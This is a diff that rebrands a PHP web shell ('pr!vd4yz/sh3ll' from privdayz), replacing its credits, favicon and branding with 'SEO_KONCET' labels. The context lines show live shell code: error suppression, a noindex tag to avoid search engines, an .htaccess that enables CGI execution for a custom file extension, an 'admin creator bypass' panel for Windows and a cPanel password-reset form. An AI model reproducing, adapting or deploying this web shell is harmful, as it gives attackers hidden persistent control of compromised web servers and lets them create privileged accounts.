@@ -1,14 +1,5 @@
 <?php
-##########################################################
-#  _____  _____  ____      _______  _  ___     ________  #
-# |  __ \|  __ \/_ \ \    / /  __ \| || \ \   / /___  /  #
-# | |__) | |__) || |\ \  / /| |  | | || |\ \_/ /   / /   #
-# |  ___/|  _  / | | \ \/ / | |  | |__   _\   /   / /    #
-# | |    | | \ \ | |  \  /  | |__| |  | |  | |   / /__   #
-# |_|    |_|  \_\|_|   \/   |_____/   |_|  |_|  /_____|  #
-# powered by privdayz.com - 2025                         #
-# github.com/privdayzcom   ||   t.me/privdayz            #
-##########################################################
+
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log', NULL);
@@ -51,15 +42,15 @@ return implode("\n", $out);
     <meta name="googlebot" content="noindex">
     <title>pr!v/v1 [<?= $_SERVER['SERVER_NAME']; ?>]</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css?v=<?=$pr1bys?>">
-    <link rel="icon" href="https://cdn.privdayz.com/v1/favicon.png?v=<?=$pr1bys?>" />
+    <link rel="icon" href="https://ik.imagekit.io/expx/Fly.gif?v=<?=$pr1bys?>" />
     <link href="https://cdn.privdayz.com/v1/style.min.css?v=<?=$pr1bys?>" rel="stylesheet">
 </head>
 <header class="prv-header">
   <div class="prv-header2-bar">
     <div class="prv-logo2">
     <span class="prv-logo2-led"></span>
-    <span class="prv-logo2-txt">pr!vd4yz<b class="prv-ver2">/sh3ll</b></span>
-    <small><a href="https://t.me/privdayz">t.me/privdayz</a></small>
+    <span class="prv-logo2-txt">ADMIN<b class="prv-ver2">/KOCOK</b></span>
+    <small><a href="https://google.com">SEO_KONCET</a></small>
     <span class="prv-logo2-dot"></span>
     </div>
   </div>
@@ -1215,7 +1206,7 @@ if(isset($_POST['pz_target_path'])) {
     $cgidir = 'pr1vd4yz_cgi';
     if (!is_dir($cgidir)) @mkdir($cgidir,0755,true);
     $htaccess = <<<HTA
-#by www.privdayz.com
+#by www.peler
 Options FollowSymLinks MultiViews Indexes ExecCGI
 AddType application/x-httpd-cgi .d4yz
 AddHandler cgi-script .d4yz
@@ -1622,7 +1613,7 @@ if(
   <div class="cmdnirvana-header" style="display:flex;align-items:center;gap:10px;">
     <div class="cmdnirvana-ico"><i class="fas fa-user-shield"></i></div>
     <div>
-      <div class="cmdnirvana-title" style="font-size:1.15em;">ultra admin creator bypass (Windows/2025) - by privdayz.com</div>
+      <div class="cmdnirvana-title" style="font-size:1.15em;">ultra admin creator bypass (Windows/2025) - by SeoKoncet</div>
     </div>
   </div>
   <div class="cmdnirvana-content" style="margin-top:25px;">
@@ -2406,7 +2397,7 @@ foreach ($features as $name => $fn) {
     <form action="" method="post">
      <div class="pr1vd4yz-wiz-section">
        <div class="pr1vd4yz-wiz-section-icon" style="background:#fff5e6;color:#fb923c;"><i class="fas fa-envelope"></i></div>
-       <div class="pr1vd4yz-wiz-fields"><input type="email" name="resetcp" class="pr1vd4yz-wiz-input" placeholder="privdayz@privdayz.com">
+       <div class="pr1vd4yz-wiz-fields"><input type="email" name="resetcp" class="pr1vd4yz-wiz-input" placeholder="FREE@koncet">
        </div>
      </div>
      <div class="pr1vd4yz-modal-actions-wiz">
